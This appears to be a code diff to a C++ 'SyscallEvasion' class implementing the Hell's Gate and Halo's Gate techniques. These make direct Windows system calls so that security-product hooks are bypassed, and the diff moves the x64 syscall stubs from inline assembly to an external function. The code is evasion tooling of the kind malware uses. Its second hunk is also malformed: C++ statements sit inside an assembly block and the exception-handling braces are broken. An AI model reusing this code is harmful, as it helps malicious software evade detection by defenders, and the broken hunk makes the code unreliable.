@@ -31,14 +31,9 @@ NTSTATUS SyscallEvasion::HellsGate(DWORD hash, PVOID arg1, PVOID arg2, PVOID arg
     
 #ifdef _WIN64
     __try {
-        NTSTATUS result;
-        __asm {
-            mov r10, rcx
-            mov eax, syscallNumber
-            syscall
-            mov result, eax
-        }
-        return result;
+        // Use external assembly function for x64
+        extern "C" NTSTATUS ExecuteSyscall(DWORD syscallNumber, void* args);
+        return ExecuteSyscall(syscallNumber, args);
     }
     __except(EXCEPTION_EXECUTE_HANDLER) {
         return 0xC0000001L;
@@ -62,16 +57,13 @@ NTSTATUS SyscallEvasion::HalosGate(DWORD hash, PVOID arg1, PVOID arg2, PVOID arg
         __try {
             NTSTATUS result;
             __asm {
-                mov r10, rcx
-                mov eax, cleanSyscall
-                syscall
-                mov result, eax
+                // Use external assembly function for x64
+                extern "C" NTSTATUS ExecuteSyscall(DWORD syscallNumber, void* args);
+                return ExecuteSyscall(cleanSyscall, args);
             }
-            return result;
-        }
-        __except(EXCEPTION_EXECUTE_HANDLER) {
-            return 0xC0000001L;
-        }
+            __except(EXCEPTION_EXECUTE_HANDLER) {
+                return 0xC0000001L;
+            }
 #endif
     }
     
